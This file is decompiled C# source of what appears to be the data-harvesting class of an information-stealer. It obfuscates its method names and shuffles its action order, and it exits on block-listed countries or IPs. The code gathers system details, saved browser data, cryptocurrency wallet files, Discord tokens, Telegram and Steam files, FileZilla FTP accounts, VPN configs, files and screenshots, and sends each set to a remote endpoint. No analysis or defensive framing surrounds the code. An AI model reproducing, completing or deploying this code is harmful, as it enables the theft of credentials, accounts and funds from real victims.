using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.CSharp.RuntimeBinder;

// Token: 0x02000010 RID: 16
public class ByPartSender : IdentitySenderBase
{
	// Token: 0x0600005C RID: 92 RVA: 0x000066DC File Offset: 0x000048DC
	public ByPartSender()
	{
		IdentitySenderBase.Actions = new ParsSt[]
		{
			new ParsSt(ByPartSender.asdk9345asd),
			new ParsSt(ByPartSender.asdk8jasd),
			new ParsSt(ByPartSender.ылв92р34выа),
			new ParsSt(ByPartSender.аловй),
			new ParsSt(ByPartSender.ыал8р45),
			new ParsSt(ByPartSender.ываш9р34),
			new ParsSt(ByPartSender.ывал8н34),
			new ParsSt(ByPartSender.вал93тфыв),
			new ParsSt(ByPartSender.вашу0л34),
			new ParsSt(ByPartSender.навева),
			new ParsSt(ByPartSender.ащы9р34),
			new ParsSt(ByPartSender.ыва83о4тфыв),
			new ParsSt(ByPartSender.askd435),
			new ParsSt(ByPartSender.sdi845sa),
			new ParsSt(ByPartSender.длвап9345)
		};
		IdentitySenderBase.PreStageActions = new ParsSt[]
		{
			new ParsSt(ByPartSender.sdf934asd),
			new ParsSt(ByPartSender.asd44123),
			new ParsSt(ByPartSender.sdfi35sdf),
			new ParsSt(ByPartSender.sdfo8n234),
			new ParsSt(ByPartSender.asdkadu8),
			new ParsSt(ByPartSender.fdfg9i3jn4)
		};
		Random rnd = new Random();
		IdentitySenderBase.Actions = (from x in IdentitySenderBase.Actions
		orderby rnd.Next()
		select x).ToArray<ParsSt>();
		IdentitySenderBase.PreStageActions = (from x in IdentitySenderBase.PreStageActions
		orderby rnd.Next()
		select x).ToArray<ParsSt>();
	}

	// Token: 0x0600005D RID: 93 RVA: 0x000033E0 File Offset: 0x000015E0
	public override bool Send(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		return ByPartSender.sdf9j3nasd(connection, settings, ref result);
	}

	// Token: 0x0600005E RID: 94 RVA: 0x00006898 File Offset: 0x00004A98
	public static bool sdf9j3nasd(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		bool result2;
		try
		{
			result.ScanDetails = new ScanDetails
			{
				AvailableLanguages = new List<string>(),
				Browsers = new List<Browser>(),
				FtpConnections = new List<Account>(),
				GameChatFiles = new List<ScannedFile>(),
				GameLauncherFiles = new List<ScannedFile>(),
				InstalledBrowsers = new List<BrowserVersion>(),
				MessageClientFiles = new List<ScannedFile>(),
				NordAccounts = new List<Account>(),
				Open = new List<ScannedFile>(),
				Processes = new List<string>(),
				Proton = new List<ScannedFile>(),
				ScannedFiles = new List<ScannedFile>(),
				ScannedWallets = new List<ScannedFile>(),
				SecurityUtils = new List<string>(),
				Softwares = new List<string>(),
				SystemHardwares = new List<SystemHardware>()
			};
			ByPartSender.dsf9jb(settings, ref result);
			result.SeenBefore = Program.SeenBefore();
			result.ReplaceEmptyValues();
			foreach (ParsSt parsSt in IdentitySenderBase.PreStageActions)
			{
				try
				{
					parsSt(connection, settings, ref result);
				}
				catch (InvalidOperationException ex)
				{
					throw ex;
				}
				catch (Exception)
				{
				}
			}
			if (connection.TryInit(result) != ApiResponse.Success)
			{
				throw new InvalidOperationException();
			}
			ByPartSender.LSIDsd2(connection, settings, ref result);
			while (!connection.TryConfirm())
			{
				if (!connection.TryGetConnection())
				{
					Thread.Sleep(1000);
				}
			}
			result2 = true;
		}
		catch (InvalidOperationException ex2)
		{
			throw ex2;
		}
		catch (Exception)
		{
			result2 = false;
		}
		return result2;
	}

	// Token: 0x0600005F RID: 95 RVA: 0x00006A50 File Offset: 0x00004C50
	public static void dsf9jb(ScanningArgs settings, ref ScanResult result)
	{
		GeoInfo geoInfo = LocatorAPI.Gather();
		geoInfo.IP = (string.IsNullOrWhiteSpace(geoInfo.IP) ? "UNKNOWN" : geoInfo.IP);
		geoInfo.Location = (string.IsNullOrWhiteSpace(geoInfo.Location) ? "UNKNOWN" : geoInfo.Location);
		geoInfo.Country = (string.IsNullOrWhiteSpace(geoInfo.Country) ? "UNKNOWN" : geoInfo.Country);
		geoInfo.PostalCode = (string.IsNullOrWhiteSpace(geoInfo.PostalCode) ? "UNKNOWN" : geoInfo.PostalCode);
		List<string> blockedCountry = settings.BlockedCountry;
		if (blockedCountry != null && blockedCountry.Count > 0 && settings.BlockedCountry.Contains(geoInfo.Country))
		{
			Environment.Exit(0);
		}
		List<string> blockedIP = settings.BlockedIP;
		if (blockedIP != null && blockedIP.Count > 0 && settings.BlockedIP.Contains(geoInfo.IP))
		{
			Environment.Exit(0);
		}
		result.IPv4 = geoInfo.IP;
		result.City = geoInfo.Location;
		result.Country = geoInfo.Country;
		result.ZipCode = geoInfo.PostalCode;
	}

	// Token: 0x06000060 RID: 96 RVA: 0x00006B74 File Offset: 0x00004D74
	public static bool LSIDsd2(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		bool result2;
		try
		{
			foreach (ParsSt parsSt in IdentitySenderBase.Actions)
			{
				try
				{
					parsSt(connection, settings, ref result);
				}
				catch (InvalidOperationException ex)
				{
					throw ex;
				}
				catch (Exception)
				{
				}
			}
			result2 = true;
		}
		catch (InvalidOperationException ex2)
		{
			throw ex2;
		}
		catch (Exception)
		{
			result2 = false;
		}
		return result2;
	}

	// Token: 0x06000061 RID: 97 RVA: 0x000033EA File Offset: 0x000015EA
	public static void asdkadu8(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.Hardware = CryptoHelper.GetMd5Hash(Environment.UserDomainName + Environment.UserName + SystemInfoHelper.GetSerialNumber()).Replace("-", string.Empty);
	}

	// Token: 0x06000062 RID: 98 RVA: 0x0000341A File Offset: 0x0000161A
	public static void sdfo8n234(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.FileLocation = Assembly.GetExecutingAssembly().Location;
	}

	// Token: 0x06000063 RID: 99 RVA: 0x0000342C File Offset: 0x0000162C
	public static void sdfi35sdf(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.Language = InputLanguage.CurrentInputLanguage.Culture.EnglishName;
		result.OSVersion = SystemInfoHelper.GetWindowsVersion();
	}

	// Token: 0x06000064 RID: 100 RVA: 0x00006BE8 File Offset: 0x00004DE8
	public static void asd44123(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (ByPartSender.<>o__8.<>p__1 == null)
		{
			ByPartSender.<>o__8.<>p__1 = CallSite<Func<CallSite, object, string>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.Convert(CSharpBinderFlags.None, typeof(string), typeof(ByPartSender)));
		}
		Func<CallSite, object, string> target = ByPartSender.<>o__8.<>p__1.Target;
		CallSite <>p__ = ByPartSender.<>o__8.<>p__1;
		if (ByPartSender.<>o__8.<>p__0 == null)
		{
			ByPartSender.<>o__8.<>p__0 = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.InvokeMember(CSharpBinderFlags.None, "ToString", null, typeof(ByPartSender), new CSharpArgumentInfo[]
			{
				CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
			}));
		}
		result.Resolution = target(<>p__, ByPartSender.<>o__8.<>p__0.Target(ByPartSender.<>o__8.<>p__0, Resolution.MonitorSize()));
	}

	// Token: 0x06000065 RID: 101 RVA: 0x0000344E File Offset: 0x0000164E
	public static void fdfg9i3jn4(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.TZ = TimeZoneInfo.Local.DisplayName;
	}

	// Token: 0x06000066 RID: 102 RVA: 0x00003460 File Offset: 0x00001660
	public static void sdf934asd(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.MachineName = Environment.UserName;
	}

	// Token: 0x06000067 RID: 103 RVA: 0x00006C8C File Offset: 0x00004E8C
	public static void asdk9345asd(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		List<SystemHardware> list = new List<SystemHardware>();
		foreach (SystemHardware item in SystemInfoHelper.GetProcessors())
		{
			list.Add(item);
		}
		foreach (SystemHardware item2 in SystemInfoHelper.GetGraphicCards())
		{
			list.Add(item2);
		}
		list.Add(new SystemHardware
		{
			Name = "Total of RAM",
			HardType = HardwareType.Graphic,
			Counter = SystemInfoHelper.TotalOfRAM()
		});
		ApiResponse apiResponse = connection.TryInitHardwares(list);
		if (apiResponse == ApiResponse.RepeatPart)
		{
			ByPartSender.asdk9345asd(connection, settings, ref result);
		}
		if (apiResponse == ApiResponse.NotFound)
		{
			throw new InvalidOperationException();
		}
	}

	// Token: 0x06000068 RID: 104 RVA: 0x0000346D File Offset: 0x0000166D
	public static void asdk8jasd(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		ApiResponse apiResponse = connection.TryInitInstalledBrowsers(SystemInfoHelper.GetBrowsers());
		if (apiResponse == ApiResponse.RepeatPart)
		{
			ByPartSender.asdk8jasd(connection, settings, ref result);
		}
		if (apiResponse == ApiResponse.NotFound)
		{
			throw new InvalidOperationException();
		}
	}

	// Token: 0x06000069 RID: 105 RVA: 0x0000348F File Offset: 0x0000168F
	public static void ылв92р34выа(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		ApiResponse apiResponse = connection.TryInitInstalledSoftwares(SystemInfoHelper.ListOfPrograms());
		if (apiResponse == ApiResponse.RepeatPart)
		{
			ByPartSender.ылв92р34выа(connection, settings, ref result);
		}
		if (apiResponse == ApiResponse.NotFound)
		{
			throw new InvalidOperationException();
		}
	}

	// Token: 0x0600006A RID: 106 RVA: 0x000034B1 File Offset: 0x000016B1
	public static void аловй(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		List<string> vs = SystemInfoHelper.GetVs();
		ApiResponse apiResponse = connection.TryInitDefenders((vs != null) ? vs.ToList<string>() : null);
		if (apiResponse == ApiResponse.RepeatPart)
		{
			ByPartSender.аловй(connection, settings, ref result);
		}
		if (apiResponse == ApiResponse.NotFound)
		{
			throw new InvalidOperationException();
		}
	}

	// Token: 0x0600006B RID: 107 RVA: 0x000034DF File Offset: 0x000016DF
	public static void ыал8р45(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		ApiResponse apiResponse = connection.TryInitProcesses(SystemInfoHelper.ListOfProcesses());
		if (apiResponse == ApiResponse.RepeatPart)
		{
			ByPartSender.ыал8р45(connection, settings, ref result);
		}
		if (apiResponse == ApiResponse.NotFound)
		{
			throw new InvalidOperationException();
		}
	}

	// Token: 0x0600006C RID: 108 RVA: 0x00003501 File Offset: 0x00001701
	public static void ываш9р34(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		ApiResponse apiResponse = connection.TryInitLanguages(SystemInfoHelper.AvailableLanguages());
		if (apiResponse == ApiResponse.RepeatPart)
		{
			ByPartSender.ываш9р34(connection, settings, ref result);
		}
		if (apiResponse == ApiResponse.NotFound)
		{
			throw new InvalidOperationException();
		}
	}

	// Token: 0x0600006D RID: 109 RVA: 0x00003523 File Offset: 0x00001723
	public static void длвап9345(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanScreen)
		{
			ApiResponse apiResponse = connection.TryInitDisplay(Resolution.Print());
			if (apiResponse == ApiResponse.RepeatPart)
			{
				ByPartSender.длвап9345(connection, settings, ref result);
			}
			if (apiResponse == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x0600006E RID: 110 RVA: 0x00006D78 File Offset: 0x00004F78
	public static void ывал8н34(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanTelegram)
		{
			List<ScannedFile> result2 = FileScanning.Search(new FileScanner[]
			{
				new DesktopMessanger()
			});
			ApiResponse apiResponse = connection.TryInitTelegramFiles(result2);
			if (apiResponse == ApiResponse.RepeatPart)
			{
				ByPartSender.ывал8н34(connection, settings, ref result);
			}
			if (apiResponse == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x0600006F RID: 111 RVA: 0x00006DC0 File Offset: 0x00004FC0
	public static void вал93тфыв(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanBrowsers)
		{
			List<Browser> list = new List<Browser>();
			list.AddRange(Chr_0_M_e.Scan(settings.ScanChromeBrowsersPaths));
			list.AddRange(g_E_c_к_0.TryFind(settings.ScanGeckoBrowsersPaths));
			ApiResponse apiResponse = connection.TryInitBrowsers(list);
			if (apiResponse == ApiResponse.RepeatPart)
			{
				ByPartSender.вал93тфыв(connection, settings, ref result);
			}
			if (apiResponse == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x06000070 RID: 112 RVA: 0x0000354D File Offset: 0x0000174D
	public static void вашу0л34(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanFiles)
		{
			ApiResponse apiResponse = connection.TryInitScannedFiles(FileSearcher.Search(settings.ScanFilesPaths));
			if (apiResponse == ApiResponse.RepeatPart)
			{
				ByPartSender.вашу0л34(connection, settings, ref result);
			}
			if (apiResponse == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x06000071 RID: 113 RVA: 0x0000357D File Offset: 0x0000177D
	public static void навева(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanFTP)
		{
			ApiResponse apiResponse = connection.TryInitFtpConnections(FileZilla.Scan());
			if (apiResponse == ApiResponse.RepeatPart)
			{
				ByPartSender.навева(connection, settings, ref result);
			}
			if (apiResponse == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x06000072 RID: 114 RVA: 0x00006E1C File Offset: 0x0000501C
	public static void ащы9р34(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanWallets)
		{
			BrEx brEx = new BrEx();
			brEx.Init(settings.ScanChromeBrowsersPaths);
			List<ScannedFile> result2 = FileScanning.Search(new FileScanner[]
			{
				new Armory(),
				new Atomic(),
				new C_o1_n0_mи(),
				new EL3_K_Tr00M(),
				new Eth(),
				new E_x0_d_u_S(),
				new Guarda(),
				new Jx(),
				new mYDict(),
				new AllWallets(),
				new Binance(),
				brEx
			});
			ApiResponse apiResponse = connection.TryInitColdWallets(result2);
			if (apiResponse == ApiResponse.RepeatPart)
			{
				ByPartSender.ащы9р34(connection, settings, ref result);
			}
			if (apiResponse == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x06000073 RID: 115 RVA: 0x000035A7 File Offset: 0x000017A7
	public static void ыва83о4тфыв(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanDiscord)
		{
			IEnumerable<ScannedFile> tokens = Discord.GetTokens();
			ApiResponse apiResponse = connection.TryInitDiscord((tokens != null) ? tokens.ToList<ScannedFile>() : null);
			if (apiResponse == ApiResponse.RepeatPart)
			{
				ByPartSender.ыва83о4тфыв(connection, settings, ref result);
			}
			if (apiResponse == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x06000074 RID: 116 RVA: 0x000035DD File Offset: 0x000017DD
	public static void askd435(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanSteam)
		{
			ApiResponse apiResponse = connection.TryInitSteamFiles(FileScanning.Search(new FileScanner[]
			{
				new GameLauncher()
			}));
			if (apiResponse == ApiResponse.RepeatPart)
			{
				ByPartSender.askd435(connection, settings, ref result);
			}
			if (apiResponse == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x06000075 RID: 117 RVA: 0x00006ED0 File Offset: 0x000050D0
	public static void sdi845sa(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanVPN)
		{
			connection.TryInitNordVPN(NordApp.Find());
			connection.TryInitOpenVPN(FileScanning.Search(new FileScanner[]
			{
				new OpenVPN()
			}));
			connection.TryInitProtonVPN(FileScanning.Search(new FileScanner[]
			{
				new ProtonVPN()
			}));
		}
	}
}
